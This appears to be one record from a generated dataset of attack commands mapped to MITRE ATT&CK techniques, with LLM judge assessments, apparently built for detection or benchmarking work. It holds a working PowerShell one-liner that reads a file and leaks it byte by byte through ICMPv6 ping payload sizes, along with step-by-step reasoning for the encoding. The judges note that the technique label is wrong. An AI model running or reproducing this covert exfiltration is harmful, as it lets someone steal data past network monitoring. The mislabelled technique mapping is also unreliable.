command: $dh='fd00:feed::a'; $dl='fd00:feed::b'; $bytes=[IO.File]::ReadAllBytes('C:\Users\Public\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $dh -Count 1 -BufferSize (400 + $hi) -IPv6 -Quiet | Out-Null; Test-Connection -ComputerName $dl -Count 1 -BufferSize (400 + $lo) -IPv6 -Quiet | Out-Null }
explanation: Splits each byte into nibbles and sends them as ICMPv6 payload sizes to two different IPv6 endpoints, employing an alternate medium per T1011.
rationale_steps: Split each byte into high and low 4-bit values.
Encode each nibble into the -BufferSize field with a safe offset.
Send to separate IPv6 destinations to facilitate decoding and framing.

llm_judgments.syntactic_justification: The PowerShell command is perfectly well-formed with balanced parentheses, proper variable assignments, correct foreach loop syntax, and valid cmdlet parameters.
llm_judgments.semantic_justification: While the command does implement exfiltration over an alternate protocol (ICMPv6) as claimed, it doesn't align with T1011 (Exfiltration Over Other Network Medium) but rather T1048 (Exfiltration Over Alternative Protocol) and doesn't implement data destruction as described in the technique.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correct PowerShell syntax for variable assignments, file operations, loops, bitwise operators, and cmdlet usage with appropriate parameters and output suppression.
llm_judgments.semantic_justification: The command reads a file and exfiltrates its content via ICMPv6 payload sizes; it performs no action related to data destruction as defined by MITRE ATT&CK T1011.

llm_judgments.syntactic_justification: PowerShell one-liner is well-formed with balanced quotes and valid operators/parameters for Test-Connection, assignments, and loop syntax.
llm_judgments.semantic_justification: The command exfiltrates file bytes covertly via ICMPv6 payload sizes and does not perform any data deletion, wiping, or destruction as described.
